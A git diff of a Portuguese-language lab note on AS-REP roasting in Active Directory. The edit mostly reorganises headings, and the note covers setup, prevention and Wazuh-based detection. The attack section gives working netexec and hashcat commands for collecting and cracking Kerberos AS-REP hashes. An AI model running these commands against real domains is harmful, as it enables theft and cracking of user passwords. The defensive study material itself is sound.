@@ -1,9 +1,17 @@
-### Descrição
+👉 [Explicação](#explicação)  
+⚙️ [Configuração](#configuração)  
+⚠️ [Ataque](#ataque)  
+🛡️ [Prevenção](#prevenção)  
+📊 [Detecção](#detecção)
+
+## Explicação
 O ataque AS-REProasting é semelhante ao ataque Kerberoasting; podemos obter hashes quebráveis para contas de usuário que têm a propriedade Não exigir pré-autenticação Kerberos ativada. O sucesso desse ataque depende da força da senha da conta de usuário que vamos quebrar.
+
+## Configuração
 <img width="1334" height="790" alt="conf" src="https://github.com/user-attachments/assets/e5e3e10d-7c78-46cf-9c6f-c0d43328f5b6" />
 
 
-### Attack
+## Ataque
 
 Com netexec
 ```nxc ldap 192.168.3.143 -u users.txt '' --asreproast hashes.txt ```
@@ -25,11 +33,11 @@ Com impacket desde linux
 Cracking com hashcat
 ```hashcat -a 0 -m 18200 -a 0 asrep.txt rockyou.txt --force -O```
 
-### Prevencao
+## Prevenção
 Senhas fortes
 Configuracao do Tipo de Pré-Autenticação, que contém informações relacionadas ao tipo de solicitação. Ferramentas que aproveitam a opção “Não exigir pré-autenticação Kerberos” em uma conta de usuário de domínio geram o tipo 0 no evento relacionado ao logon sem Pré-Autenticação. 
 
-### Wazuh rules e log
+### Detecção
 
 No wazuh manager, no arquivo /var/ossec/etc/rules/local_rules.xml colar o seguinte codigo para detecao de 
 ```
@@ -50,5 +58,6 @@ No wazuh manager, no arquivo /var/ossec/etc/rules/local_rules.xml colar o seguin
 ```
 
 <img width="1853" height="929" alt="wzroasting" src="https://github.com/user-attachments/assets/9bf7fcdc-c2ae-4c35-b3b8-c308b0e56744" />
+
 
 
